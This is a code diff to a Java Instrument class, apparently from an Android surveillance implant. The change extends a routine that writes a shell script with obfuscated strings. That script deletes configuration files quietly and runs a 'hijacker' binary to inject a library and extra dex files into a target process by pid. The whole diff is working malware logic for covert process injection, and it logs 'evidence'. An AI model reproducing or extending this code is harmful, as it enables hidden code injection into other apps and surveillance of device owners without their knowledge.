@@ -10,6 +10,7 @@ import com.android.dvci.file.Path;
 import com.android.mm.M;
 
 import java.io.File;
+import java.util.ArrayList;
 import java.util.Date;
 import java.util.concurrent.Semaphore;
 import java.util.concurrent.TimeUnit;
@@ -36,6 +37,7 @@ public class Instrument implements Runnable{
 	private boolean watcherContinue = false;
 	private boolean threadRunning = false;
 	private Thread thread = null;
+	private ArrayList<String> argList = new ArrayList<String>();
 
 
 	public Instrument(String process, String dump,Semaphore sem,String library,String owner) {
@@ -51,9 +53,9 @@ public class Instrument implements Runnable{
 	}
 	public Instrument(String process, String dump,Semaphore sem,String library,String _dexFile,String owner) {
 		this(process,dump,sem,library,owner);
-		if(dex_dest!=null) {
+		if(_dexFile!=null) {
 			dexFile = _dexFile;
-			dex_dest = "d" + dexFile.hashCode() + ".dex";
+			dex_dest = "d" + dexFile.hashCode();
 		}
 	}
 
@@ -62,7 +64,7 @@ public class Instrument implements Runnable{
 	}
 
 	public String getInstrumentationSuccessDir() {
-		return instrumentationSuccessDir+"/";
+		return instrumentationSuccessDir;
 	}
 
 	public void setInstrumentationSuccessDir(String storageDirName,boolean autoCreate) {
@@ -203,13 +205,16 @@ public class Instrument implements Runnable{
 						// Run the injector
 						String scriptName = String.valueOf(Math.abs((int)Utils.getRandom()))+"ij";
 						String script = M.e("#!/system/bin/sh") + "\n";
-						script += M.e("rm ")+ getInstrumentationSuccessDir() +M.e("*.cnf") + "\n";
+						script += M.e("rm ")+ getInstrumentationSuccessDir() +M.e("*.cnf") + M.e(" >/dev/null\n");
 
 						String farg =" ";
 						if( !StringUtils.isEmpty(dumpPath)) {
-							farg += "-f " + dumpPath;
+							farg += "-f " + dumpPath+" ";
 							if ( !StringUtils.isEmpty(dexFile)) {
-								farg += dex_dest + "\n";
+								farg +="-f " + dex_dest+" ";
+							}
+							for( String arg : argList){
+								farg +="-f " + arg+" ";
 							}
 						}
 						script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib_dest + farg ;
@@ -566,6 +571,12 @@ public class Instrument implements Runnable{
 			EvidenceBuilder.info(M.e("OOB cannot be installed,too many trials"));
 		}
 		return false;
+	}
+
+	public void addArg(String arg) {
+		if (!StringUtils.isEmpty(arg)){
+			argList.add(arg);
+		}
 	}
 
 
